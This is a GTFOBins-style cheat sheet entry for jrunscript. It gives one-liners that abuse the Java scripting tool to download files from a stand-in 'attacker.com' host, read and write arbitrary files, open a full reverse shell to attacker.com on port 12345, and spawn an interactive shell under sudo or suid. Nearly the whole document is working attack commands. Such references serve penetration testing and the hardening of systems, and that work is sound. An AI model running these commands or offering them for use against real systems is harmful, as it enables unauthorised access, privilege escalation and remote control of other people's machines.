---
type: gtfobin
name: jrunscript
platform: Unix
functions: [download, file-read, file-write, reverse-shell, shell]
tags: [gtfobin, unix, lotl]
---

# jrunscript

## download

```bash
jrunscript -e 'cp("http://attacker.com/path/to/input-file","/path/to/output-file")'
```
**Contexts:** sudo, unprivileged

## file-read

```bash
jrunscript -e 'br = new BufferedReader(new java.io.FileReader("/path/to/input-file"));
    while ((line = br.readLine()) != null) { print(line); }'
```
**Contexts:** sudo, unprivileged

## file-write

```bash
jrunscript -e 'var fw=new java.io.FileWriter("/path/to/output-file");
    fw.write("DATA");
    fw.close();'
```
**Contexts:** sudo, unprivileged

## reverse-shell

```bash
jrunscript -e 'var host="attacker.com";
    var port=12345;
    var p=new java.lang.ProcessBuilder("/bin/sh", "-i").redirectErrorStream(true).start();
    var s=new java.net.Socket(host,port);
    var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
    var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();
    java.lang.Thread.sleep(50);
    try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'
```
**Contexts:** sudo, unprivileged

## shell

```bash
jrunscript -e 'exec("/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty")'
```
**Contexts:** sudo, suid, unprivileged
